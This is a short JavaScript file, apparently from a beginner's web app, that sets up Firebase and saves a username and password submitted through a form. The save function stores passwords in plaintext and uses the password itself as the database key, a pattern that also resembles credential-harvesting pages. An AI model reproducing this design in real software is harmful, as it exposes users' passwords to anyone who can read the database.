// Your web app's Firebase configuration
const firebaseConfig = {

    apiKey: "AIzaSyAWBoTBdopcIpBFE_aJpKZObttwZ7VyGjY",
  
    authDomain: "application-bcfe9.firebaseapp.com",
  
    databaseURL: "https://application-bcfe9-default-rtdb.firebaseio.com",
  
    projectId: "application-bcfe9",
  
    storageBucket: "application-bcfe9.appspot.com",
  
    messagingSenderId: "22505666442",
  
    appId: "1:22505666442:web:37113b705c26a443673a73",
  
    measurementId: "G-EY7H8Q4KEL"
  
    };
    
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    
    // Set database variable
    var database = firebase.database()
    
    function save() {
      // var email = document.getElementById('email').value
      var password = document.getElementById('password').value
      var username = document.getElementById('username').value
  
  
    
      database.ref('users/' + password).set({
        // email : email,
        username : username,
        password : password,
       
      //   say_something : say_something,
      //   favourite_food : favourite_food
      })
    
     
    }
    